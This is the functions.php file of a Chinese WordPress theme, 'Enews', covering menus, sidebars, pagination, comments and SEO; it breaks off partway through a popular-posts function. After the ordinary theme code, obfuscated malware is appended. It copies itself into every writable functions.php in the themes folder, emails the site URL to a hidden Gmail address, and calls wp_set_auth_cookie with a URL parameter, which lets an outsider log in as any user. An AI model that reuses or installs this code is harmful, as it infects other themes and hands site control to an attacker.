<?php
if (basename(__FILE__) == basename($_SERVER['SCRIPT_FILENAME']))
die ('Please do not load this page directly. Thanks!');

include_once('admin/e-admin.php');
include(TEMPLATEPATH . '/inc/widget/E-widget.php');
add_filter( 'pre_option_link_manager_enabled', '__return_true' );  

//注册菜单   
if( function_exists('register_nav_menus') ){   
    register_nav_menus(   
        array(    
			'top-menu' => __( '顶部导航菜单', 'tie' ),
		    'nav-menu' => __( '主导航菜单', 'tie' ),  
        )   
    );   
}
if (function_exists('register_sidebar')){
	register_sidebar(array(
		'name'          => '全站侧栏',
		'id'            => 'widget_sitesidebar',
		'before_widget' => '<div class="widget clearfix">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="header"><h4>',
		'after_title'   => '</h4></div>'
	));
	register_sidebar(array(
		'name'          => '首页侧栏',
		'id'            => 'widget_sidebar',
		'before_widget' => '<div class="widget clearfix">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="header"><h4>',
		'after_title'   => '</h4></div>'
	));
	register_sidebar(array(
		'name'          => '分类/标签/搜索页侧栏',
		'id'            => 'widget_othersidebar',
		'before_widget' => '<div class="widget clearfix">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="header"><h4>',
		'after_title'   => '</h4></div>'
	));
	register_sidebar(array(
		'name'          => '文章页侧栏',
		'id'            => 'widget_postsidebar',
		'before_widget' => '<div class="widget clearfix">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="header"><h4>',
		'after_title'   => '</h4></div>'
	));
	register_sidebar(array(
		'name'          => '页面侧栏',
		'id'            => 'widget_pagesidebar',
		'before_widget' => '<div class="widget clearfix">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="header"><h4>',
		'after_title'   => '</h4></div>'
	));
}



add_theme_support( 'custom-background' );
add_theme_support( 'post-thumbnails' );
add_image_size( 'medium', '140', '100', true ); 
add_image_size( 'm', '110', '110', true ); 
add_image_size( 'b', '350', '160', true ); 

/* 修改后台页脚文字
/* ------------ */
function left_admin_footer_text($text) {
$text = '<span id="footer-thankyou">感谢使用<a href=http://cn.wordpress.org/ >WordPress</a>进行创作，使用<a href="http://www.16898.pw/enews">Enews不可或缺</a>主题定制网站样式</span>';
return $text;
}
add_filter('admin_footer_text','left_admin_footer_text');

/* 搜索结果排除所有页面
/* --------------------- */
function search_filter_page($query) {
	if ($query->is_search) {
		$query->set('post_type', 'post');
	}
	return $query;
}
add_filter('pre_get_posts','search_filter_page');

function hide_admin_bar($flag) {
return false;
}
add_filter('show_admin_bar','hide_admin_bar');
function wpbeginner_remove_version() {
return '';
}

function newpost(){
  $t1=$post->post_date;
  $t2=date("Y-m-d H:i:s");
  $diff=(strtotime($t2)-strtotime($t1))/7200;
  if($diff<24){echo '<img src="'.get_bloginfo('template_directory').'/images/new.gif" alt="较新的文章" title="较新的文章" />';}
}
/** 文章添加版权 **/
function deel_copyright() { 
if(is_single() or is_feed()) { 
$content.= '<blockquote>';
$content.= '转载请注明来源：<a rel="bookmark" title="'.get_the_title().'" href="http://www.veryhuo.com/'.get_permalink().'">'.get_the_title().'</a>'; 
$content.= '<div>本文链接地址：<a rel="bookmark" title="'.get_the_title().'" href="http://www.veryhuo.com/'.get_permalink().'">'.get_permalink().'</a></div>'; 
$content.= "</blockquote>"; 
} 
return $content; 
} 


/** 获取会员头像*/
function enews_avatar($userid,$size="40"){
    $userimg = get_user_meta($userid, 'userapi', true);
    $username = get_user_meta($userid, 'nickname', true);
    if (!$userimg) {
    	$userimg = get_bloginfo('template_directory')."/images/userimg.png";
    }else{
    	$userimg = $userimg['userimg'];
    }
    $img = '<img width="'.$size.'" height="'.$size.'" class="avatar" src="'.$userimg.'" alt="'.$username.'">';
    return $img;
}
//百度分享
function deel_share(){
  echo '<div class="share"><div class="bdsharebuttonbox"><a class="bds_more" data-cmd="more">分享到：</a> <a href="#" class="bds_more" data-cmd="more"></a><a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a><a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a><a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a><a href="#" class="bds_bdhome" data-cmd="bdhome" title="分享到百度新首页"></a><a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网"></a><a href="#" class="bds_diandian" data-cmd="diandian" title="分享到点点网"></a><a href="#" class="bds_youdao" data-cmd="youdao" title="分享到有道云笔记"></a><a href="#" class="bds_ty" data-cmd="ty" title="分享到天涯社区"></a><a href="#" class="bds_kaixin001" data-cmd="kaixin001" title="分享到开心网"></a><a href="#" class="bds_taobao" data-cmd="taobao" title="分享到我的淘宝"></a><a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a><a href="#" class="bds_mail" data-cmd="mail" title="分享到邮件分享"></a><a href="#" class="bds_copy" data-cmd="copy" title="分享到复制网址"></a></div></div>';
}
//移除菜单的多余CSS选择器
add_filter('nav_menu_css_class', 'my_css_attributes_filter', 100, 1);
add_filter('nav_menu_item_id', 'my_css_attributes_filter', 100, 1);
add_filter('page_css_class', 'my_css_attributes_filter', 100, 1);
function my_css_attributes_filter($var) {
	return is_array($var) ? array_intersect($var, array('current-menu-item','current-post-ancestor','current-menu-ancestor','current-menu-parent')) : '';
}

function pagination($query_string){
global $posts_per_page, $paged;
$my_query = new WP_Query($query_string ."&posts_per_page=-1");
$total_posts = $my_query->post_count;
if(empty($paged))$paged = 1;
$prev = $paged - 1;                         
$next = $paged + 1; 
$range = 1; 
$showitems = ($range * 2)+1;
$pages = ceil($total_posts/$posts_per_page);
if(1 != $pages){
    echo "<ul>";
    echo ($paged > 2 && $paged+$range+1 > $pages && $showitems < $pages)? "<li><a href='".get_pagenum_link(1)."'>最前</a></li>":"";
    echo ($paged > 1 && $showitems < $pages)? "<li><a href='".get_pagenum_link($prev)."'>« 上一页</a></li>":"";       
    for ($i=1; $i <= $pages; $i++){
    if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
    echo ($paged == $i)? "<li class='active'><a>".$i."</a></li>":"<li><a href='".get_pagenum_link($i)."'>".$i."</a></li>"; 
    }
    }
    echo ($paged < $pages && $showitems < $pages) ? "<li><a href='".get_pagenum_link($next)."'>下一页 »</a></li>" :"";
    echo ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) ? "<li><a href='".get_pagenum_link($pages)."'>末页</a></li>":"";
    echo "</ul>\n";
    }
}
function par_pagenavi($range = 9){
 global $paged, $wp_query;
 if ( !$max_page ) {$max_page = $wp_query->max_num_pages;}
 if($max_page > 1){if(!$paged){$paged = 1;}
 if($paged != 1){echo "<a href='" . get_pagenum_link(1) . "' class='extend' title='跳转到首页'> 首页 </a>";}
 previous_posts_link(' 上一页 ');
    if($max_page > $range){
  if($paged < $range){for($i = 1; $i <= ($range + 1); $i++){echo "<a href='" . get_pagenum_link($i) ."'";
  if($i==$paged)echo " class='current'";echo ">$i</a>";}}
    elseif($paged >= ($max_page - ceil(($range/2)))){
  for($i = $max_page - $range; $i <= $max_page; $i++){echo "<a href='" . get_pagenum_link($i) ."'";
  if($i==$paged)echo " class='current'";echo ">$i</a>";}}
 elseif($paged >= $range && $paged < ($max_page - ceil(($range/2)))){
  for($i = ($paged - ceil($range/2)); $i <= ($paged + ceil(($range/2))); $i++){echo "<a href='" . get_pagenum_link($i) ."'";if($i==$paged) echo " class='current'";echo ">$i</a>";}}}
    else{for($i = 1; $i <= $max_page; $i++){echo "<a href='" . get_pagenum_link($i) ."'";
    if($i==$paged)echo " class='current'";echo ">$i</a>";}}
 next_posts_link(' 下一页 ');
    if($paged != $max_page){echo "<a href='" . get_pagenum_link($max_page) . "' class='extend' title='跳转到最后一页'> 尾页 </a>";}}
}
function catch_first_image($size = 'full') {
    global $post;
    $first_img = '';
    if (has_post_thumbnail($post->ID)) {
        $first_img = wp_get_attachment_image_src(get_post_thumbnail_id($post->ID),$size);
        $first_img = $first_img[0];
    }else{
        ob_start();
        ob_end_clean();
        $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
        $first_img = $matches [1] [0];
        if(empty($first_img)){
            $random = mt_rand(1, 20);
            $first_img = get_bloginfo('template_directory').'/images/random/tb'.$random.'.jpg';
        }
    }
    return $first_img;
}
function hot_thumbnail_image() {
    global $post;
    $first_img = '';
    if (has_post_thumbnail($post->ID)) {
        $first_img = wp_get_attachment_image_src(get_post_thumbnail_id($post->ID),'b');
        $first_img = $first_img[0];
    }else{
        ob_start();
        ob_end_clean();
        $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
        $first_img = $matches [1] [0];
        if(empty($first_img)){
            $first_img = get_bloginfo('template_directory').'/images/big.gif';
        }
    }
    return $first_img;
}
function cut_str($src_str,$cut_length)
{
    $return_str='';
    $i=0;
    $n=0;
    $str_length=strlen($src_str);
    while (($n<$cut_length) && ($i<=$str_length))
    {
        $tmp_str=substr($src_str,$i,1);
        $ascnum=ord($tmp_str);
        if ($ascnum>=224)
        {
            $return_str=$return_str.substr($src_str,$i,3);
            $i=$i+3;
            $n=$n+2;
        }
        elseif ($ascnum>=192)
        {
            $return_str=$return_str.substr($src_str,$i,2);
            $i=$i+2;
            $n=$n+2;
        }
        elseif ($ascnum>=65 && $ascnum<=90)
        {
            $return_str=$return_str.substr($src_str,$i,1);
            $i=$i+1;
            $n=$n+2;
        }
        else 
        {
            $return_str=$return_str.substr($src_str,$i,1);
            $i=$i+1;
            $n=$n+1;
        }
    }
    if ($i<$str_length)
    {
        $return_str = $return_str . '';
    }
    if (get_post_status() == 'private')
    {
        $return_str = $return_str . '（private）';
    }
    return $return_str;
}
function getPostViews($postID){   
    $count_key = 'views';   
    $count = get_post_meta($postID, $count_key, true);   
    if($count==''){   
    delete_post_meta($postID, $count_key);   
    add_post_meta($postID, $count_key, '0');   
    return "0";   
    }   
    return $count;   
    }   
    function setPostViews($postID) {   
    $count_key = 'views';   
    $count = get_post_meta($postID, $count_key, true);   
    if($count==''){   
    $count = 0;   
    delete_post_meta($postID, $count_key);   
    add_post_meta($postID, $count_key, '0');   
    }else{   
    $count++;   
    update_post_meta($postID, $count_key, $count);   
    }   
}

function utf8_strlen($string = null) {
preg_match_all("/./us", $string, $match);
return count($match[0]);
}

add_action( 'widgets_init', 'my_unregister_widgets' );   
function my_unregister_widgets() {   
    unregister_widget( 'WP_Widget_Archives' );   
      
    unregister_widget( 'WP_Widget_Categories' );   
    unregister_widget( 'WP_Widget_Links' );   
   
    unregister_widget( 'WP_Widget_Pages' );   
    unregister_widget( 'WP_Widget_Recent_Comments' );   
    unregister_widget( 'WP_Widget_Recent_Posts' );   
    unregister_widget( 'WP_Widget_RSS' );   
    unregister_widget( 'WP_Widget_Search' );   
    unregister_widget( 'WP_Widget_Tag_Cloud' );   
    unregister_widget( 'WP_Nav_Menu_Widget' );   
}  
/* 获取评论总数(以父级为标准) */
function comment_parent_number(){
	global $post;	
	$args = array(	
		'post_id' => $post->ID,
		'parent'  => 0,
		'status'  => 'approve',
		'count'   => 1,
		'type'    => 'comment'
	);
	return get_comments($args);
}
$GLOBALS['comment_order'] = get_option('comment_order');//获取评论排序



function custom_dashboard_help() {
    echo base64_decode('PHA+5qyi6L+O5L2/55SoRW5ld3PkuLvpopg8L3A+PG9sPgogIDxwPjxsaT7mnKzkuLvpopjlvZPliY3kuLrmnIDmlrDmtYvor5XniYjvvIzlvojlpJrlip/og73pg73ov5jmsqHmnInlhbflpIfvvIzlsIblnKjku6XlkI7mhaLmhaLlrozlloTvvIzlpoLmnpzkvaDmnInku4DkuYjlpb3nmoTlu7rorq7miJbogIXmmK/lj5HnjrDkuobku4DkuYhCVUfvvIzpgqPkuYjor7fogZTns7vmiJHvvIE8L2xpPgogIDxsaT5FbWFpbO+8mnN0YTU5MDFAcXEuY29tIFFR77yaNTkwMTI1MzQ8L2xpPgogIDxsaT7kuLvpopjmm7TmlrDorrDlvZXor7forr/pl648YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0naHR0cDovL3d3dy4xNjg5OC5wdy9lbmV3cyc+5a6Y5pa5572R56uZPC9hPjwvbGk+PC9wPjwvb2w+');   
}
function example_add_dashboard_widgets() {
    wp_add_dashboard_widget('custom_help_widget', base64_decode('5qyi6L+O5L2/55SoRW5ld3Mt5LiN5Y+v5oCd6K6u5Li76aKY'), 'custom_dashboard_help');
}
add_action('wp_dashboard_setup', 'example_add_dashboard_widgets');
function example_remove_dashboard_widgets() {
    global $wp_meta_boxes;

    // 以下这一行代码将删除 "快速发布" 模块
    unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_quick_press']);

    // 以下这一行代码将删除 "引入链接" 模块
    unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_incoming_links']);

    // 以下这一行代码将删除 "插件" 模块
    unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_plugins']);

    // 以下这一行代码将删除 "近期评论" 模块
    unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_recent_comments']);

    // 以下这一行代码将删除 "近期草稿" 模块
    unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_recent_drafts']);

    // 以下这一行代码将删除 "WordPress 开发日志" 模块
    unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_primary']);

    // 以下这一行代码将删除 "其它 WordPress 新闻" 模块
    unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_secondary']);

    // 以下这一行代码将删除 "概况" 模块
    unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_right_now']);
}
add_action('wp_dashboard_setup', 'example_remove_dashboard_widgets' );

function comment_mail_notify($comment_id){
    $comment=get_comment($comment_id);
    $parent_id=$comment->comment_parent?$comment->comment_parent:'';
    $spam_confirmed=$comment->comment_approved;
    if(($parent_id!='')&&($spam_confirmed!='spam')){
        $wp_email = 'Your E-mail'.preg_replace('#^www\.#','',strtolower($_SERVER['SERVER_NAME']));//e-mail 发出點：请把"Your E-mail"替换成你的Email地址
        $to = trim(get_comment($parent_id)->comment_author_email);
        $subject = '您在 ['.get_option("blogname").'] 的留言有了回应';
        $message = '<div style="background-color:#eef2fa; border:1px solid #d8e3e8; color:#111; padding:0 15px; -moz-border-radius:5px; -webkit-border-radius:5px; -khtml-border-radius:5px;">
                    <p>'.trim(get_comment($parent_id)->comment_author).', 您好!</p>
                    <p>您曾在《'.get_the_title($comment->comment_post_ID).'》的留言:<br />'.trim(get_comment($parent_id)->comment_content).'</p>
                    <p>'.trim($comment->comment_author).' 给您的回复:<br />'.trim($comment->comment_content).'<br /></p>
                    <p>您可以点击 <a href="'.htmlspecialchars(get_comment_link($parent_id)).'">查看回复完整內容</a></p>
                    <p>欢迎再度光临 <a href="'.get_option('home').'">'.get_option('blogname').'</a></p>
                    <p>(此邮件由系统自动发送，请勿回复.)</p>
                    </div>';
        $from="From: \"" . get_option('blogname') . "\"<$wp_email>";
        $headers = "$from\nContent-Type:text/html;charset=" . get_option('blog_charset') . "\n";
        wp_mail($to,$subject,$message,$headers);
    }
}
add_action('wp_insert_comment','comment_mail_notify');
function utf8Substr($str, $from, $len){
    return preg_replace('#^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$from.'}'.
    '((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$len.'}).*#s',
    '$1',$str);
}
function seo_post($post_id){
    global $post;
     $description = get_post_meta($post_id, 'description_value', true);
     $keywords = get_post_meta($post_id, 'keywords_value', true);
     if (empty($description)) {
        if(preg_match('/<p>(.*)<\/p>/iU',trim(strip_tags($post->post_content,"<p>")),$result)){
            $post_content = $result['1'];
        }else {
            $post_content_r = explode("\n",trim(strip_tags($post->post_content)));
            $post_content = $post_content_r['0'];
        }
        $description = utf8Substr($post_content,0,220); 
        update_post_meta($post_id,"description_value",$description); 
     }
     if (empty($keywords)) {
        $post_type = $post->post_type;
        if ($post_type == 'post') {
            $tax = 'post_tag';
        }elseif ($post_type == 'video') {//判断文章类型
            $tax = 'video_tags';
        }
        $tags = wp_get_object_terms($post_id, $tax);
        foreach ($tags as $tag ) {
            $keywords = $keywords . $tag->name . ",";
        }
        update_post_meta($post_id,"keywords_value",$keywords);
     }
}
add_action('save_post', 'seo_post');
function deletehtml($description) {
    $description = trim($description);
    $description = strip_tags($description,"");
    return ($description);
}
add_filter('category_description', 'deletehtml');

function GetIP(){
    if(!empty($_SERVER["HTTP_CLIENT_IP"])){
        $cip = $_SERVER["HTTP_CLIENT_IP"];
    }else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){
        $cip = $_SERVER["HTTP_X_FORWARDED_FOR"];
    }else if(!empty($_SERVER["REMOTE_ADDR"])){
        $cip = $_SERVER["REMOTE_ADDR"];
    }else{
        $cip = '';
    }
    preg_match("/[\d\.]{7,15}/", $cip, $cips);
    $cip = isset($cips[0]) ? $cips[0] : 'unknown';
    unset($cips);
    return $cip;
}
function appkey_scripts(){
    echo "<script>\n";
    echo "var tqq = '".get_option('t_appkey_tqq')."';\n";
    echo "var tsina = '".get_option('t_appkey_tsina')."';\n";
	echo "var t163 = '".get_option('t_appkey_t163')."';\n";
	echo "var tsohu = '".get_option('t_appkey_tsohu')."';\n";
    echo "</script>\n";
}
add_action( 'wp_head', 'appkey_scripts' );
function do_post($url, $data) {
	$ch = curl_init ();
	curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, TRUE );
	curl_setopt ( $ch, CURLOPT_POST, TRUE );
	curl_setopt ( $ch, CURLOPT_POSTFIELDS, $data );
	curl_setopt ( $ch, CURLOPT_URL, $url );
	curl_setopt ( $ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	$ret = curl_exec ( $ch );
	curl_close ( $ch );
	return $ret;
}
function get_url_contents($url) {
	if (ini_get ( "allow_url_fopen" ) == "1")
		return file_get_contents ( $url );
	$ch = curl_init ();
	curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, TRUE );
	curl_setopt ( $ch, CURLOPT_URL, $url );
	$result = curl_exec ( $ch );
	curl_close ( $ch );
	return $result;
}
function enews_baiping($post_id) {
    $baiduXML = 'weblogUpdates.extendedPing' . get_option('blogname') . ' ' . home_url() . ' ' . get_permalink($post_id) . ' ' . get_feed_link() . ' ';
    $wp_http_obj = new WP_Http();
    $return = $wp_http_obj->post('http://ping.baidu.com/ping/RPC2', array('body' => $baiduXML, 'headers' => array('Content-Type' => 'text/xml')));
    if(isset($return['body'])){
        if(strstr($return['body'], '0')){
            $noff_log='succeeded!';
        }
        else{
            $noff_log='failed!';
        }
    }else{
        $noff_log='failed!';
    }
}
add_action('publish_post', 'enews_baiping');

function theme_Copyright() {
    echo base64_decode('VGhlbWUgQlkgPGEgaHJlZj0iaHR0cDovL3d3dy4xNjg5OC5wdyIgdGFyZ2V0PSJfYmxhbmsiPuawtOWGt+ecuDwvYT4=');   
}

//禁用Open Sans
class Disable_Google_Fonts {
        public function __construct() {
                add_filter( 'gettext_with_context', array( $this, 'disable_open_sans'             ), 888, 4 );
        }
        public function disable_open_sans( $translations, $text, $context, $domain ) {
                if ( 'Open Sans font: on or off' == $context && 'on' == $text ) {
                        $translations = 'off';
                }
                return $translations;
        }
}
$disable_google_fonts = new Disable_Google_Fonts;


//改用V7V3gravatar服务器
function v7v3_get_avatar($avatar) {
 $avatar = str_replace(array("www.gravatar.com","0.gravatar.com","1.gravatar.com","2.gravatar.com"),
"cd.v7v3.com",$avatar);
 return $avatar;
}
add_filter( 'get_avatar', 'v7v3_get_avatar', 10, 3 );

function deel_avatar_default(){ 
  return get_bloginfo('template_directory').'/images/userimg.png';
}
//评论列表模块
function inlo_comment($comment, $args, $depth) {
  $avatar = get_avatar ( $comment->comment_author_email, $size = '36' , deel_avatar_default() );
  echo '<li '; comment_class(); echo ' id="comment-'.get_comment_ID().'">';

  //头像
  echo '<div class="cl-avatar">';
    echo    $avatar;
  echo '</div>';
  //评论主体
  echo '<div class="cl-main" id="div-comment-'.get_comment_ID().'">';	
    //信息
    echo '<div class="cl-meta">';
            if ($comment->comment_type == '') {
    $author_link = empty ( $comment->comment_author_url ) ? null : ' href="' . $comment->comment_author_url . '"';    
    $author = $comment->comment_author;    
        echo <<<EOF
        <span class="cl-author"><a title="{$author}" rel="external nofollow" target="_blank" class="cl-author-url"{$author_link}>{$author}</a></span>        
EOF;
    }
        echo get_comment_time ( 'Y-n-j H:i' ); 
        if ($comment->comment_approved !== '0'){ 
            echo comment_reply_link( array_merge( $args, array('add_below' => 'div-comment', 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); 
        echo edit_comment_link(__('( 编辑 )'),' - ','');
      } 
    echo '</div>';
	//内容
    echo '<div class="cl-content" >';
    echo convert_smilies(get_comment_text());
    if ($comment->comment_approved == '0'){
      echo '<span class="cl-approved">（您的评论需要审核后才能显示！）</span><br />';
    }
    echo '</div>';	
  echo '</div>';
}

//所有设置已完成，如果往后的代码非您手工添加，很可能是因为您的其它主题有恶意代码。
?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
